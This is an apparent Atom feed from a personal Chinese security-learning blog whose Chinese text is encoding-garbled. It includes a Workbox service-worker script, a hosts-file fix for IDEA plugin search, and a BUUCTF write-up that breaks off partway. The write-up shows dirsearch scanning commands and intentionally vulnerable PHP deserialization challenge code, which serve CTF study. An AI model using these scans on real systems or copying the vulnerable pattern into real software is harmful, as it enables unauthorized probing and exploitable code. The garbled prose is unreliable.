çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨</li></ol></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF_WEB" scheme="https://kannikanyun.github.io/tags/CTF-WEB/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://kannikanyun.github.io/2022/06/17/public/workbox-e28eeb62/"/>
    <id>https://kannikanyun.github.io/2022/06/17/public/workbox-e28eeb62/</id>
    <published>2022-06-17T05:33:42.844Z</published>
    <updated>2022-06-17T05:34:15.862Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>define(["exports"],(function(t){"use strict";try{self["workbox:core:6.4.1"]&&_()}catch(t){}const e=(t,...e)=>{let s=t;return e.length>0&&(s+=` :: ${JSON.stringify(e)}`),s};class s extends Error{constructor(t,s){super(e(t,s)),this.name=t,this.details=s}}try{self["workbox:routing:6.4.1"]&&_()}catch(t){}const r=t=>t&&"object"==typeof t?t:{handle:t};class n{constructor(t,e,s="GET"){this.handler=r(e),this.match=t,this.method=s}setCatchHandler(t){this.catchHandler=r(t)}}class i extends n{constructor(t,e,s){super((({url:e})=>{const s=t.exec(e.href);if(s&&(e.origin===location.origin||0===s.index))return s.slice(1)}),e,s)}}class o{constructor(){this.t=new Map,this.i=new Map}get routes(){return this.t}addFetchListener(){self.addEventListener("fetch",(t=>{const{request:e}=t,s=this.handleRequest({request:e,event:t});s&&t.respondWith(s)}))}addCacheListener(){self.addEventListener("message",(t=>{if(t.data&&"CACHE_URLS"===t.data.type){const{payload:e}=t.data,s=Promise.all(e.urlsToCache.map((e=>{"string"==typeof e&&(e=[e]);const s=new Request(...e);return this.handleRequest({request:s,event:t})})));t.waitUntil(s),t.ports&&t.ports[0]&&s.then((()=>t.ports[0].postMessage(!0)))}}))}handleRequest({request:t,event:e}){const s=new URL(t.url,location.href);if(!s.protocol.startsWith("http"))return;const r=s.origin===location.origin,{params:n,route:i}=this.findMatchingRoute({event:e,request:t,sameOrigin:r,url:s});let o=i&&i.handler;const a=t.method;if(!o&&this.i.has(a)&&(o=this.i.get(a)),!o)return;let c;try{c=o.handle({url:s,request:t,event:e,params:n})}catch(t){c=Promise.reject(t)}const h=i&&i.catchHandler;return c instanceof Promise&&(this.o||h)&&(c=c.catch((async r=>{if(h)try{return await h.handle({url:s,request:t,event:e,params:n})}catch(t){t instanceof Error&&(r=t)}if(this.o)return this.o.handle({url:s,request:t,event:e});throw r}))),c}findMatchingRoute({url:t,sameOrigin:e,request:s,event:r}){const n=this.t.get(s.method)||[];for(const i of n){let n;const o=i.match({url:t,sameOrigin:e,request:s,event:r});if(o)return n=o,(Array.isArray(n)&&0===n.length||o.constructor===Object&&0===Object.keys(o).length||"boolean"==typeof o)&&(n=void 0),{route:i,params:n}}return{}}setDefaultHandler(t,e="GET"){this.i.set(e,r(t))}setCatchHandler(t){this.o=r(t)}registerRoute(t){this.t.has(t.method)||this.t.set(t.method,[]),this.t.get(t.method).push(t)}unregisterRoute(t){if(!this.t.has(t.method))throw new s("unregister-route-but-not-found-with-method",{method:t.method});const e=this.t.get(t.method).indexOf(t);if(!(e>-1))throw new s("unregister-route-route-not-registered");this.t.get(t.method).splice(e,1)}}let a;const c=()=>(a||(a=new o,a.addFetchListener(),a.addCacheListener()),a);const h={googleAnalytics:"googleAnalytics",precache:"precache-v2",prefix:"workbox",runtime:"runtime",suffix:"undefined"!=typeof registration?registration.scope:""},u=t=>[h.prefix,t,h.suffix].filter((t=>t&&t.length>0)).join("-"),f=t=>t||u(h.runtime);function l(t,e){const s=new URL(t);for(const t of e)s.searchParams.delete(t);return s.href}class w{constructor(){this.promise=new Promise(((t,e)=>{this.resolve=t,this.reject=e}))}}const d=new Set;try{self["workbox:strategies:6.4.1"]&&_()}catch(t){}function p(t){return"string"==typeof t?new Request(t):t}class y{constructor(t,e){this.h={},Object.assign(this,e),this.event=e.event,this.u=t,this.l=new w,this.p=[],this.v=[...t.plugins],this.m=new Map;for(const t of this.v)this.m.set(t,{});this.event.waitUntil(this.l.promise)}async fetch(t){const{event:e}=this;let r=p(t);if("navigate"===r.mode&&e instanceof FetchEvent&&e.preloadResponse){const t=await e.preloadResponse;if(t)return t}const n=this.hasCallback("fetchDidFail")?r.clone():null;try{for(const t of this.iterateCallbacks("requestWillFetch"))r=await t({request:r.clone(),event:e})}catch(t){if(t instanceof Error)throw new s("plugin-error-request-will-fetch",{thrownErrorMessage:t.message})}const i=r.clone();try{let t;t=await fetch(r,"navigate"===r.mode?void 0:this.u.fetchOptions);for(const s of this.iterateCallbacks("fetchDidSucceed"))t=await s({event:e,request:i,response:t});return t}catch(t){throw n&&await this.runCallbacks("fetchDidFail",{error:t,event:e,originalRequest:n.clone(),request:i.clone()}),t}}async fetchAndCachePut(t){const e=await this.fetch(t),s=e.clone();return this.waitUntil(this.cachePut(t,s)),e}async cacheMatch(t){const e=p(t);let s;const{cacheName:r,matchOptions:n}=this.u,i=await this.getCacheKey(e,"read"),o=Object.assign(Object.assign({},n),{cacheName:r});s=await caches.match(i,o);for(const t of this.iterateCallbacks("cachedResponseWillBeUsed"))s=await t({cacheName:r,matchOptions:n,cachedResponse:s,request:i,event:this.event})||void 0;return s}async cachePut(t,e){const r=p(t);var n;await(n=0,new Promise((t=>setTimeout(t,n))));const i=await this.getCacheKey(r,"write");if(!e)throw new s("cache-put-with-no-response",{url:(o=i.url,new URL(String(o),location.href).href.replace(new RegExp(`^${location.origin}`),""))});var o;const a=await this.g(e);if(!a)return!1;const{cacheName:c,matchOptions:h}=this.u,u=await self.caches.open(c),f=this.hasCallback("cacheDidUpdate"),w=f?await async function(t,e,s,r){const n=l(e.url,s);if(e.url===n)return t.match(e,r);const i=Object.assign(Object.assign({},r),{ignoreSearch:!0}),o=await t.keys(e,i);for(const e of o)if(n===l(e.url,s))return t.match(e,r)}(u,i.clone(),["__WB_REVISION__"],h):null;try{await u.put(i,f?a.clone():a)}catch(t){if(t instanceof Error)throw"QuotaExceededError"===t.name&&await async function(){for(const t of d)await t()}(),t}for(const t of this.iterateCallbacks("cacheDidUpdate"))await t({cacheName:c,oldResponse:w,newResponse:a.clone(),request:i,event:this.event});return!0}async getCacheKey(t,e){const s=`${t.url} | ${e}`;if(!this.h[s]){let r=t;for(const t of this.iterateCallbacks("cacheKeyWillBeUsed"))r=p(await t({mode:e,request:r,event:this.event,params:this.params}));this.h[s]=r}return this.h[s]}hasCallback(t){for(const e of this.u.plugins)if(t in e)return!0;return!1}async runCallbacks(t,e){for(const s of this.iterateCallbacks(t))await s(e)}*iterateCallbacks(t){for(const e of this.u.plugins)if("function"==typeof e[t]){const s=this.m.get(e),r=r=>{const n=Object.assign(Object.assign({},r),{state:s});return e[t](n)};yield r}}waitUntil(t){return this.p.push(t),t}async doneWaiting(){let t;for(;t=this.p.shift();)await t}destroy(){this.l.resolve(null)}async g(t){let e=t,s=!1;for(const t of this.iterateCallbacks("cacheWillUpdate"))if(e=await t({request:this.request,response:e,event:this.event})||void 0,s=!0,!e)break;return s||e&&200!==e.status&&(e=void 0),e}}t.CacheFirst=class extends class{constructor(t={}){this.cacheName=f(t.cacheName),this.plugins=t.plugins||[],this.fetchOptions=t.fetchOptions,this.matchOptions=t.matchOptions}handle(t){const[e]=this.handleAll(t);return e}handleAll(t){t instanceof FetchEvent&&(t={event:t,request:t.request});const e=t.event,s="string"==typeof t.request?new Request(t.request):t.request,r="params"in t?t.params:void 0,n=new y(this,{event:e,request:s,params:r}),i=this.q(n,s,e);return[i,this.R(i,n,s,e)]}async q(t,e,r){let n;await t.runCallbacks("handlerWillStart",{event:r,request:e});try{if(n=await this.O(e,t),!n||"error"===n.type)throw new s("no-response",{url:e.url})}catch(s){if(s instanceof Error)for(const i of t.iterateCallbacks("handlerDidError"))if(n=await i({error:s,event:r,request:e}),n)break;if(!n)throw s}for(const s of t.iterateCallbacks("handlerWillRespond"))n=await s({event:r,request:e,response:n});return n}async R(t,e,s,r){let n,i;try{n=await t}catch(i){}try{await e.runCallbacks("handlerDidRespond",{event:r,request:s,response:n}),await e.doneWaiting()}catch(t){t instanceof Error&&(i=t)}if(await e.runCallbacks("handlerDidComplete",{event:r,request:s,response:n,error:i}),e.destroy(),i)throw i}}{async O(t,e){let r,n=await e.cacheMatch(t);if(!n)try{n=await e.fetchAndCachePut(t)}catch(t){t instanceof Error&&(r=t)}if(!n)throw new s("no-response",{url:t.url,error:r});return n}},t.clientsClaim=function(){self.addEventListener("activate",(()=>self.clients.claim()))},t.registerRoute=function(t,e,r){let o;if("string"==typeof t){const s=new URL(t,location.href);o=new n((({url:t})=>t.href===s.href),e,r)}else if(t instanceof RegExp)o=new i(t,e,r);else if("function"==typeof t)o=new n(t,e,r);else{if(!(t instanceof n))throw new s("unsupported-route-type",{moduleName:"workbox-routing",funcName:"registerRoute",paramName:"capture"});o=t}return c().registerRoute(o),o}}));//# sourceMappingURL=workbox-e28eeb62.js.map]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://kannikanyun.github.io/2022/06/17/public/service-worker/"/>
    <id>https://kannikanyun.github.io/2022/06/17/public/service-worker/</id>
    <published>2022-06-17T05:33:42.838Z</published>
    <updated>2022-06-17T05:34:15.859Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>if(!self.define){let e,t={};const o=(o,n)=>(o=new URL(o+".js",n).href,t[o]||new Promise((t=>{if("document"in self){const e=document.createElement("script");e.src=o,e.onload=t,document.head.appendChild(e)}else e=o,importScripts(o),t()})).then((()=>{let e=t[o];if(!e)throw new Error(`Module ${o} didnâ€™t register its module`);return e})));self.define=(n,r)=>{const s=e||("document"in self?document.currentScript.src:"")||location.href;if(t[s])return;let i={};const c=e=>o(e,s),l={module:{uri:s},exports:i,require:c};t[s]=Promise.all(n.map((e=>l[e]||c(e)))).then((e=>(r(...e),i)))}}define(["./workbox-e28eeb62"],(function(e){"use strict";self.skipWaiting(),e.clientsClaim(),e.registerRoute(/^https:\/\/cdn\.example\.com\/.*/,new e.CacheFirst,"GET")}));//# sourceMappingURL=service-worker.js.map]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>è®°IDEAæ— æ³•æœç´¢æ’ä»¶</title>
    <link href="https://kannikanyun.github.io/2022/06/17/%E8%AE%B0IDEA%E6%97%A0%E6%B3%95%E6%90%9C%E7%B4%A2%E6%8F%92%E4%BB%B6/"/>
    <id>https://kannikanyun.github.io/2022/06/17/%E8%AE%B0IDEA%E6%97%A0%E6%B3%95%E6%90%9C%E7%B4%A2%E6%8F%92%E4%BB%B6/</id>
    <published>2022-06-17T05:00:37.000Z</published>
    <updated>2022-06-17T05:26:54.531Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="IDEAæ±‰åŒ–é—®é¢˜"><a href="#IDEAæ±‰åŒ–é—®é¢˜" class="headerlink" title="IDEAæ±‰åŒ–é—®é¢˜"></a>IDEAæ±‰åŒ–é—®é¢˜</h1><p>æœç´¢æ±‰åŒ–æ’ä»¶è¿‡ç¨‹ä¸­ä¸€ç›´åŠ è½½æ²¡åˆ«çš„æ˜¾ç¤ºï¼ŒæŒ‚äº†<img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206171308607.png" alt="img">ä½†æ˜¯ä¸è¡Œå“‡ï¼Œé‡å¯ä¹Ÿä¸è¡Œ</p><p>äºæ˜¯æœç´¢ä¸€ä¸‹ï¼Œä¸å¾—ä¸è¯´ï¼Œäº’è”ç½‘çœŸçš„å¼ºå¤§ï¼Œåªè¦ä½ æƒ³å­¦ï¼Œéƒ½æœ‰äººæ•™</p><h2 id="ä¿®å¤è¿‡ç¨‹ï¼š"><a href="#ä¿®å¤è¿‡ç¨‹ï¼š" class="headerlink" title="ä¿®å¤è¿‡ç¨‹ï¼š"></a>ä¿®å¤è¿‡ç¨‹ï¼š</h2><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206171312515.png" alt="image-20220617131206398"></p><h3 id="å…ˆè®¾ç½®ä»£ç†ï¼š"><a href="#å…ˆè®¾ç½®ä»£ç†ï¼š" class="headerlink" title="å…ˆè®¾ç½®ä»£ç†ï¼š"></a>å…ˆè®¾ç½®ä»£ç†ï¼š</h3><p><a href="http://127.0.0.1:1080/">http://127.0.0.1:1080</a> ==é‡å¯==åä¾æ—§ä¸è¡Œ</p><p>ç»§ç»­é‡æ–°è®¾ç½®</p><p><a href="https://plugins.jetbrains.com/">https://plugins.jetbrains.com/</a></p><p>ç‚¹å‡»<img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206171314184.png" alt="image-20220617131448148"></p><p><strong>æ˜¾ç¤ºè¿æ¥è¶…æ—¶ï¼Œå¯èƒ½ä¸ç½‘ç»œæœ‰å…³</strong></p><h3 id="ç½‘ç»œéªŒè¯ï¼š"><a href="#ç½‘ç»œéªŒè¯ï¼š" class="headerlink" title="ç½‘ç»œéªŒè¯ï¼š"></a>ç½‘ç»œéªŒè¯ï¼š</h3><p><strong>win+Rè¾“å…¥/cmdï¼Œæ‰“å¼€å‘½ä»¤æç¤ºç¬¦ï¼Œping plugins.jetbrains.com</strong></p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206171316830.png" alt="image-20220617131620773"></p><p><strong>å¦‚æœæ˜¯è¿™æ ·å°±ä»£è¡¨ç½‘ç»œå»¶è¿Ÿå¾ˆé«˜ï¼Œå¯¼è‡´åŠ è½½ä¸å‡ºæ¥ã€‚å¦‚æœpingä¸é€šå¯èƒ½å’Œç½‘å…³æœ‰å…³ã€‚</strong></p><h3 id="ç½‘ç»œå»¶è¿Ÿå¾ˆé«˜çš„è§£å†³æ–¹æ³•ï¼š"><a href="#ç½‘ç»œå»¶è¿Ÿå¾ˆé«˜çš„è§£å†³æ–¹æ³•ï¼š" class="headerlink" title="ç½‘ç»œå»¶è¿Ÿå¾ˆé«˜çš„è§£å†³æ–¹æ³•ï¼š"></a><strong>ç½‘ç»œå»¶è¿Ÿå¾ˆé«˜çš„è§£å†³æ–¹æ³•ï¼š</strong></h3><p><strong>æ‰¾åˆ°hostæ–‡ä»¶ï¼Œæ·»åŠ ä¸€ä¸ªé…ç½®ã€‚</strong></p><blockquote><p>hostæ–‡ä»¶è·¯å¾„ï¼š<code>C:\Windows\System32\drivers\etc</code></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206171317836.png" alt="image-20220617131704801"></p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">13.249.171.117 plugins.jetbrains.com13.249.171.117 jetbrains.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206171322552.png" alt="image-20220617132213446"></p><p><strong>å¦‚æœè¿˜æ˜¯è¯·æ±‚è¶…æ—¶å¯ä»¥æ¢ä¸€ä¸ªåœ°å€</strong>ğŸ¤¦â€â™‚ï¸</p><blockquote><blockquote><p>resrartâ€”â€“&gt;<em><u>è§£å†³</u></em></p></blockquote></blockquote><h2 id="æ€»ç»“ï¼š"><a href="#æ€»ç»“ï¼š" class="headerlink" title="æ€»ç»“ï¼š"></a>æ€»ç»“ï¼š</h2><p>pingä¸€èˆ¬ç”¨æ¥æ£€æŸ¥ç½‘ç»œçŠ¶æ€</p><p>hostä¸­é…ç½®å’Œç½‘ç»œæœ‰å…³</p><p><a href="https://blog.csdn.net/qq_44790505/article/details/123844243?ops_request_misc=%7B%22request_id%22:%22165544105716782391890897%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=165544105716782391890897&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-123844243-null-null.142%5Ev17%5Epc_rank_34,157%5Ev15%5Enew_3&utm_term=idea+plugins%E4%B8%80%E7%9B%B4%E8%BD%AC%E5%9C%88&spm=1018.2226.3001.4187">å‚è€ƒæ–‡ç« </a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="JAVA" scheme="https://kannikanyun.github.io/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>BUUwebåˆ·é¢˜è®°å½•2</title>
    <link href="https://kannikanyun.github.io/2022/06/14/BUUweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/"/>
    <id>https://kannikanyun.github.io/2022/06/14/BUUweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%952/</id>
    <published>2022-06-14T10:54:15.000Z</published>
    <updated>2022-06-25T15:06:56.727Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="æå®¢å¤§æŒ‘æˆ˜-2019-PHP1"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-PHP1" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP1"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]PHP1</h1><h2 id="é¢˜ç›®æè¿°ï¼š"><a href="#é¢˜ç›®æè¿°ï¼š" class="headerlink" title="é¢˜ç›®æè¿°ï¼š"></a>é¢˜ç›®æè¿°ï¼š</h2><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206141855692.png" alt="image-20220614185558645"></p><p>æ€è·¯ï¼š</p><ol><li>ä¸€å¼€å§‹åªæƒ³åˆ°çœ‹æºç ï¼Œæ²¡å‘ç°</li><li>æç¤º==å¤‡ä»½==ï¼Œæ‰«æç½‘ç«™ç›®å½•å‘€</li></ol><p>python3 dirsearch.py -u â€œ<a href="http://49ccffbe-070a-4af8-bedc-679f278f20f3.node4.buuoj.cn:81/?.php&quot;">http://49ccffbe-070a-4af8-bedc-679f278f20f3.node4.buuoj.cn:81/?.php&quot;</a> -e * -w ndb</p><p>kali:ç›®å½•åœ¨~çš„dirsearch</p><p>æ‰«æå·¥å…·ä½¿ç”¨ï¼š</p><h2 id="dirsearchï¼š"><a href="#dirsearchï¼š" class="headerlink" title="dirsearchï¼š"></a>dirsearchï¼š</h2><p>ä¸‹è½½é¡¹ç›®ï¼Œå¹¶æ‰“å¼€</p><pre class="line-numbers language-less" data-language="less"><code class="language-less">Copyâ”Œâ”€[root<span class="token variable">@kali</span>]â”€[<span class="token operator">/</span>kali]â””â”€â”€â•¼ #git clone <span class="token property">https</span><span class="token punctuation">:</span><span class="token comment">//github.com/maurosoria/dirsearch</span>Copyâ”Œâ”€[root<span class="token variable">@kali</span>]â”€[<span class="token operator">/</span>kali]â””â”€â”€â•¼ #cd dirsearch<span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è¿è¡Œéœ€è¦python3ç¯å¢ƒ</p><pre class="line-numbers language-typescript" data-language="typescript"><code class="language-typescript">Copyâ”Œâ”€<span class="token punctuation">[</span>root<span class="token decorator"><span class="token at operator">@</span><span class="token function">kali</span></span><span class="token punctuation">]</span>â”€<span class="token punctuation">[</span><span class="token operator">/</span>kali<span class="token operator">/</span>dirsearch<span class="token punctuation">]</span>â””â”€â”€â•¼ #python3 dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"http://localhost/"</span> <span class="token operator">-</span>e <span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ‰«æç½‘ç«™éœ€è¦æŒ‡å®šç½‘ç«™çš„è„šæœ¬ç±»å‹ï¼Œ* ä¸ºå…¨éƒ¨ç±»å‹çš„è„šæœ¬</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python3 dirsearch<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"950f20e7-c4b0-4277-b5a4-98ba51ba0d1f.node4.buuoj.cn:81/"</span> <span class="token operator">-</span>e<span class="token operator">*</span> <span class="token operator">-</span>w db<span class="token operator">/</span>ç»¼åˆé«˜å±<span class="token punctuation">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>kaliä¸­py3å®‰è£…ï¼ˆkaliè‡ªå¸¦pyä¸º2.~ï¼‰</p><p>==ä½†æ˜¯è¿™ä¸ªç¬¨è›‹æ²¡æœ‰èƒ½æ‰«å‡ºæ¥å•Šå•Šå•Š==ï¼ˆè¿˜æœ‰ï¼Œå‘½ä»¤ä¸­-e*  ä¸­é—´æ²¡æœ‰ç©ºæ ¼ï¼‰</p><p>å¦‚æœè¦æ’é™¤æŸäº›HTTPçŠ¶æ€ä»£ç ï¼Œè¯·ä½¿ç”¨-xæ ‡å¿—ã€‚</p><p><em>ï¼ƒdirsearch -u</em> <em><a href="http://192.168.0.102/dvwa">http://192.168.0.102/dvwa</a></em> <em>-e php -x 403</em></p><p>[è¯¦ç»†å‘½ä»¤ï¼š]([<a href="https://www.cnblogs.com/-mo-/p/11466092.html">WEBå®‰å…¨]Dirsearchå·¥å…·å‘½ä»¤ - è‚–æ´‹è‚–æ©ã€ - åšå®¢å›­ (cnblogs.com)</a>)</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206152101795.png" alt="image-20220615210142521"></p><p>æ²¡æƒ³åˆ°Windowsä¸‹çš„dirsearchèƒ½æ‰«ï¼Œå“å“</p><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206152239673.png" alt="image-20220615223910618"></p><p><a href="%5B(6%E6%9D%A1%E6%B6%88%E6%81%AF">Windowsä¸‹dirsearché…ç½®</a> dirsearchä½¿ç”¨æ•™ç¨‹ï¼ˆWindowsç‰ˆæœ¬ï¼‰_å¤§è¥¿ç“œçš„å®‰å…¨ä¹‹è·¯çš„åšå®¢-CSDNåšå®¢_dirsearch windows](<a href="https://blog.csdn.net/qq_43006864/article/details/121929398?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=dirsearch%E7%94%A8%E4%B8%8D%E4%BA%86&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-121929398.142%5Ev14%5Epc_search_result_control_group,157%5Ev14%5Enew_3&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/qq_43006864/article/details/121929398?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=dirsearchç”¨ä¸äº†&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-121929398.142^v14^pc_search_result_control_group,157^v14^new_3&amp;spm=1018.2226.3001.4187</a>))</p><p>==åº”è¯¥æ˜¯ç½‘ç«™æœ‰æ‰«æé™åˆ¶==</p><h2 id="æ¢å¾¡å‰‘æ‰«"><a href="#æ¢å¾¡å‰‘æ‰«" class="headerlink" title="æ¢å¾¡å‰‘æ‰«"></a>æ¢å¾¡å‰‘æ‰«</h2><p><img src="https://cdn.jsdelivr.net/gh/KanNiKanYun/blog-img/blog-img202206152108050.png" alt="image-20220615210815012"></p><p>å¤šæ‰«å‡ æ¬¡ä¹Ÿä¸è¡Œï¼Œå“ï¼ˆå·¥å…·å°å­éƒ½ä¸ä¼šå½“ğŸ˜¢ï¼‰</p><p><a href="https://blog.csdn.net/weixin_51735061/article/details/124236800">é¡ºå¸¦åˆ†äº«ä¸‹å¤§ç¥æ•´ç†çš„ç½‘ç«™ç›®å½•æ‰«æå·¥å…·</a></p><hr><p>è®¿é—®<code>www.zip</code></p><h3 id="ä¸¤å¤„ä»£ç ï¼š"><a href="#ä¸¤å¤„ä»£ç ï¼š" class="headerlink" title="ä¸¤å¤„ä»£ç ï¼š"></a>ä¸¤å¤„ä»£ç ï¼š</h3><p>Class.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Name</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>NO!!!hacker!!!&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You name is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You password is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»¥åŠindex.phpä¸­</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>   <span class="token keyword">include</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span>   <span class="token variable">$select</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'select'</span><span class="token 